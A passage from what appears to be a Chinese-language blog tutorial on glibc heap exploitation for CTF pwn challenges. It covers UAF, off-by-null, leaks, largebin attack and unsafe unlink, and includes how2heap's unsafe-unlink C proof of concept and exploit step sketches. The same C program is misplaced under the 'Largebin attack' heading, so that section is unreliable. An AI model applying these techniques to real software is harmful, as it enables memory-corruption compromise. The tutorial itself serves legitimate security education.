是tcache的管理机构，也存在于堆中，如果想办法控制此结构体，即可控制tcache任意分配。\n在glibc2.30以下的版本，counts的类型是char，此结构大小是0x250。\n\n一般是作为辅助攻击的方法，可以简化攻击链。\n\n#### example\n[[2021-DownUnder-note]]\n\n### global_max_fast   \n实际上就是house of corrison的利用，类似的，tcache也有类似的利用。使得大chunk被当作tcache处理。\n\n### heap_info \n直接攻击堆管理结构体，可以看看这篇帖子:[house-of-mind](http://phrack.org/issues/66/10.html)\n#TODO \n\n\n\n\n\n\n","slug":"[Pwn]-heap-exploation-up-to-2.31","published":1,"updated":"2023-06-21T06:55:15.885Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clj5d1j780003vwij6bxh43ir","content":"<h1>Basic Knowledge</h1>\n<h6 id=\"bins\">bins:</h6>\n<table>\n<thead>\n<tr>\n<th>unsorted bin</th>\n<th>fast bin</th>\n<th>small bin</th>\n<th>large bin</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>NO LIMITATION</td>\n<td>0x20-0x80</td>\n<td>&lt;0x400</td>\n<td>&gt;0x400</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"libc-version\">libc version</h2>\n<p>ubuntu-libc version</p>\n<ul>\n<li>2.23=“16.04”</li>\n<li>2.24=“17.04”</li>\n<li>2.26=“17.10”</li>\n<li>2.27=“18.04”</li>\n<li>2.28=“18.10”</li>\n<li>2.29=“19.04”</li>\n<li>2.30=“19.10”</li>\n<li>2.31=“20.04”</li>\n<li>2.32=“20.10”</li>\n<li>2.33=“21.04”</li>\n<li>2.34=“22.04”</li>\n</ul>\n<h1>Overview</h1>\n<p>在刚刚入门堆时，笔者是比较苦恼的，笔者在学习一项知识时，习惯性地想先从大局着手来学习。即，先对这个知识内容的整体有一定了解后，再去填充细节内容。然而在笔者开始学习堆利用时，被各种繁杂的版本差异和堆利用弄得头昏脑涨，因此对于堆一直不得其门而入，无法深刻理解多种多样的技巧及其使用时机，也因此不像栈溢出一样，笔者无法快速理出一个直观的脉络，然后安排细化的学习路径。</p>\n<p>本文主要<strong>针对glibc2.30及以上</strong>有着tcache的版本。<s>因为低于2.27版本的堆笔者根本不会</s></p>\n<p>正如关于栈溢出的文章中，笔者根据攻击点将栈溢出分为三种，在这篇文章中，笔者也将拆解heap exploation，完成笔者心目中的一个划分。</p>\n<p>在笔者看来，一次堆利用主要分为一下几个步骤：</p>\n<ul>\n<li>漏洞的发现</li>\n<li>地址的泄露</li>\n<li>利用漏洞控制目标地址内容</li>\n<li>攻击的对象</li>\n</ul>\n<p>因此，本文的主要的编排顺序，也是按照这样几个顺序来实现的。笔者首先将会介绍堆利用过程中的一些基本漏洞，其次，笔者将会介绍如何完成地址泄露，接着，笔者将会讨论一些heap exploation的技术以及这些技术如何控制目标地址，而在可以控制一个目标地址后，最后笔者将讨论如何如何我们可以选取哪些攻击对象，以及他们各自有什么优劣。</p>\n<p>笔者写这一篇文章时，去年这个时间差不多是我刚刚开始学习堆利用的时间，经过一年的时间，笔者总算感觉对于堆利用有了一个比较综合性的认知，尽管当前关于heap exploation的blog很多，但是笔者仍然感觉过于零散，因此，在这篇文章中，同笔者关于栈溢出的文章一样，笔者也不会过多的讲述各个技巧的细节–去看这些技巧的提出者大师傅可能讲述地要比我更完善–而着重于贯穿各个技巧的联系， <s>才不是因为笔者懒呢</s> ，目的是提供一个学习路径的图谱和完成一次堆利用时的思考路径。</p>\n<h1>基本漏洞</h1>\n<p><strong>UAF</strong><br>\n在free时没有清空指针，可以重利用指针。<br>\n在没有<code>Edit</code> 的情况下，可以通过 <code>double free</code> 进行堆块重叠。</p>\n<p><strong>overflow</strong><br>\n溢出，可以控制下一个chunk，一般而言，可以方便地转换为堆块重叠，因此，也容易利用</p>\n<p><strong>off-by-one</strong>/<strong>off-by-null</strong><br>\n这里主要针对2.29-2.31版本, <a href=\"https://www.anquanke.com/post/id/236078#h3-4\">2.29-2.31版本的off-by-null</a> ，wjh师傅已经讲解的非常详细了，核心就是通过unsorted bin机制残留的指针伪造fd、bk，来进行unlink，最后制造堆重叠。</p>\n<p><strong>漏洞的利用</strong><br>\n上述几个漏洞都可以方便地转换为堆重叠，在此基础上，可以很方便地转换为任意地址写，在small bin的范围内，可以考虑tcache poison，在large bin的范围内，可以考虑large bin attack，在此基础上再对特定的攻击面进行攻击，即可劫持控制流<br>\n考虑:</p>\n<ul>\n<li>one gadget</li>\n<li>system(“/bin/sh”)</li>\n<li>orw</li>\n</ul>\n<h1>leak</h1>\n<p>一般而言，堆题中的leak主要是针对libc地址，heap地址的leak相对而言较为简单，而libc地址的leak将在 [[#stack]] 攻击面部分详述。</p>\n<p>一般而言，heap leak 堆地址主要利用unsorted bin的第一个chunk会存在libc地址来leak。如果存在UAF，可以将一个直接放入unsorted bin，然后show来获得。</p>\n<p>也可以释放入unsorted  bin 后再申请回来实现，由于malloc并不会清空chunk内容，因此可以读取到残留的libc的指针。</p>\n<p>而在没有show相关输出chunk内容的函数时，考虑通过<code>_IO_2_1_stdout_</code> 来leak<br>\n基本原理就是partial overwrite 覆盖unsorted  bin中的libc地址，分配到__IO_2_1_stdout的位置，然后改写来完成leak</p>\n<h1>Basic tricks up to 2.30</h1>\n<p>在2.30以上的版本，我认为需要掌握的基本技术主要包括:</p>\n<ul>\n<li>[x] largebin attack</li>\n<li>[x] tcache stashing unlink attack</li>\n<li>[x] unsafe unlink</li>\n<li>[x] tcache poison</li>\n<li>[x] house of botcake</li>\n<li>[x] decrypt safe_unlink</li>\n<li>[x] house of pig</li>\n<li>[x] 堆布局</li>\n</ul>\n<p>这里结合how to heap源代码分析</p>\n<h2 id=\"Largebin-attack\">Largebin attack</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">uint64_t</span> *chunk0_ptr;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tsetbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Welcome to unsafe unlink 2.0!\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Tested in Ubuntu 20.04 64bit.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">int</span> malloc_size = <span class=\"number\">0x420</span>; <span class=\"comment\">//we want to be big enough not to use tcache or fastbin</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> header_size = <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\\n\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tchunk0_ptr = (<span class=\"type\">uint64_t</span>*) <span class=\"built_in\">malloc</span>(malloc_size); <span class=\"comment\">//chunk0</span></span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> *chunk1_ptr  = (<span class=\"type\">uint64_t</span>*) <span class=\"built_in\">malloc</span>(malloc_size); <span class=\"comment\">//chunk1</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;The global chunk0_ptr is at %p, pointing to %p\\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;The victim chunk we are going to corrupt is at %p\\n\\n&quot;</span>, chunk1_ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We create a fake chunk inside chunk0.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\\n&quot;</span>);</span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">1</span>] = chunk0_ptr[<span class=\"number\">-1</span>] - <span class=\"number\">0x10</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\\n&quot;</span>);</span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">2</span>] = (<span class=\"type\">uint64_t</span>) &amp;chunk0_ptr-(<span class=\"keyword\">sizeof</span>(<span class=\"type\">uint64_t</span>)*<span class=\"number\">3</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\\n&quot;</span>);</span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">3</span>] = (<span class=\"type\">uint64_t</span>) &amp;chunk0_ptr-(<span class=\"keyword\">sizeof</span>(<span class=\"type\">uint64_t</span>)*<span class=\"number\">2</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Fake chunk fd: %p\\n&quot;</span>,(<span class=\"type\">void</span>*) chunk0_ptr[<span class=\"number\">2</span>]);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Fake chunk bk: %p\\n\\n&quot;</span>,(<span class=\"type\">void</span>*) chunk0_ptr[<span class=\"number\">3</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\\n&quot;</span>);</span><br><span class=\"line\">\tchunk1_hdr[<span class=\"number\">0</span>] = malloc_size;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\\n&quot;</span>,(<span class=\"type\">void</span>*)chunk1_hdr[<span class=\"number\">0</span>]);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\\n\\n&quot;</span>);</span><br><span class=\"line\">\tchunk1_hdr[<span class=\"number\">1</span>] &amp;= ~<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\\n\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(chunk1_ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"type\">char</span> victim_string[<span class=\"number\">8</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">strcpy</span>(victim_string,<span class=\"string\">&quot;Hello!~&quot;</span>);</span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">3</span>] = (<span class=\"type\">uint64_t</span>) victim_string;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Original value: %s\\n&quot;</span>,victim_string);</span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">0</span>] = <span class=\"number\">0x4141414142424242</span>LL;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;New Value: %s\\n&quot;</span>,victim_string);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// sanity check</span></span><br><span class=\"line\">\tassert(*(<span class=\"type\">long</span> *)victim_string == <span class=\"number\">0x4141414142424242</span>L);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>核心思路:</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">malloc(<span class=\"number\">0x420</span>) <span class=\"comment\"># chunk A</span></span><br><span class=\"line\">malloc(<span class=\"number\">0x18</span>)</span><br><span class=\"line\"><span class=\"comment\">#And another chunk to prevent consolidate</span></span><br><span class=\"line\">malloc(<span class=\"number\">0x410</span>) <span class=\"comment\"># chunk B</span></span><br><span class=\"line\"><span class=\"comment\">#This chunk should be smaller than [p1] and belong to the same large bin</span></span><br><span class=\"line\">malloc(<span class=\"number\">0x18</span>)</span><br><span class=\"line\"><span class=\"comment\">#And another chunk to prevent consolidate</span></span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\">malloc(<span class=\"number\">0x438</span>)</span><br><span class=\"line\"><span class=\"comment\">#Allocate a chunk larger than [p1] to insert [p1] into large bin</span></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"comment\">#Free the smaller of the two --&gt; [p2]</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>, p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(target2-<span class=\"number\">0x20</span>))</span><br><span class=\"line\"><span class=\"comment\">#最终addr1与addr2地址中的值均被赋成了victim即chunk_B的chunk header地址最终addr1与addr2地址中的值均被赋成了victim即chunk_B的chunk header地址</span></span><br><span class=\"line\">malloc(<span class=\"number\">0x438</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, p64(recover)*<span class=\"number\">2</span>) <span class=\"comment\"># 修复large bin attack </span></span><br></pre></td></tr></table></figure>\n<p><strong>修复:</strong><br>\n可以通过gdb查看未更改时chunk A的fd和bk，然后修复，免于计算</p>\n<p><strong>限制:</strong></p>\n<ul>\n<li>需要一次UAF</li>\n</ul>\n<p><strong>效果:</strong></p>\n<ul>\n<li>在2.30以上可以在任意地址写入一个libc地址</li>\n</ul>\n<h2 id=\"unsafe-unlink\">unsafe unlink</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">uint64_t</span> *chunk0_ptr;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tsetbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Welcome to unsafe unlink 2.0!\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Tested in Ubuntu 20.04 64bit.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">int</span> malloc_size = <span class=\"number\">0x420</span>; <span class=\"comment\">//we want to be big enough not to use tcache or fastbin</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> header_size = <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\\n\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tchunk0_ptr = (<span class=\"type\">uint64_t</span>*) <span class=\"built_in\">malloc</span>(malloc_size); <span class=\"comment\">//chunk0</span></span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> *chunk1_ptr  = (<span class=\"type\">uint64_t</span>*) <span class=\"built_in\">malloc</span>(malloc_size); <span class=\"comment\">//chunk1</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;The global chunk0_ptr is at %p, pointing to %p\\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;The victim chunk we are going to corrupt is at %p\\n\\n&quot;</span>, chunk1_ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We create a fake chunk inside chunk0.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We setup the size of our fake chunk so that we can bypass the check introduced in https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d6db68e66dff25d12c3bc5641b60cbd7fb6ab44f\\n&quot;</span>);</span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">1</span>] = chunk0_ptr[<span class=\"number\">-1</span>] - <span class=\"number\">0x10</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\\n&quot;</span>);</span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">2</span>] = (<span class=\"type\">uint64_t</span>) &amp;chunk0_ptr-(<span class=\"keyword\">sizeof</span>(<span class=\"type\">uint64_t</span>)*<span class=\"number\">3</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\\n&quot;</span>);</span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">3</span>] = (<span class=\"type\">uint64_t</span>) &amp;chunk0_ptr-(<span class=\"keyword\">sizeof</span>(<span class=\"type\">uint64_t</span>)*<span class=\"number\">2</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Fake chunk fd: %p\\n&quot;</span>,(<span class=\"type\">void</span>*) chunk0_ptr[<span class=\"number\">2</span>]);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Fake chunk bk: %p\\n\\n&quot;</span>,(<span class=\"type\">void</span>*) chunk0_ptr[<span class=\"number\">3</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\\n&quot;</span>);</span><br><span class=\"line\">\tchunk1_hdr[<span class=\"number\">0</span>] = malloc_size;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x430, however this is its new value: %p\\n&quot;</span>,(<span class=\"type\">void</span>*)chunk1_hdr[<span class=\"number\">0</span>]);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\\n\\n&quot;</span>);</span><br><span class=\"line\">\tchunk1_hdr[<span class=\"number\">1</span>] &amp;= ~<span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\\n\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(chunk1_ptr);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"type\">char</span> victim_string[<span class=\"number\">8</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">strcpy</span>(victim_string,<span class=\"string\">&quot;Hello!~&quot;</span>);</span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">3</span>] = (<span class=\"type\">uint64_t</span>) victim_string;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Original value: %s\\n&quot;</span>,victim_string);</span><br><span class=\"line\">\tchunk0_ptr[<span class=\"number\">0</span>] = <span class=\"number\">0x4141414142424242</span>LL;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;New Value: %s\\n&quot;</span>,victim_string);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// sanity check</span></span><br><span class=\"line\">\tassert(*(<span class=\"type\">long</span> *)victim_string == <span class=\"number\">0x4141414142424242</span>L);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>核心思路:</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># chunk 0 ptr store in &amp;ptr</span></span><br><span class=\"line\"></span><br><span class=\"line\">malloc(<span class=\"number\">0x420</span>) <span class=\"comment\"># not in fastbin or tcache</span></span><br><span class=\"line\">malloc(<span class=\"number\">0x420</span>) </span><br><span class=\"line\">edit(<span class=\"number\">0</span>, p64(<span 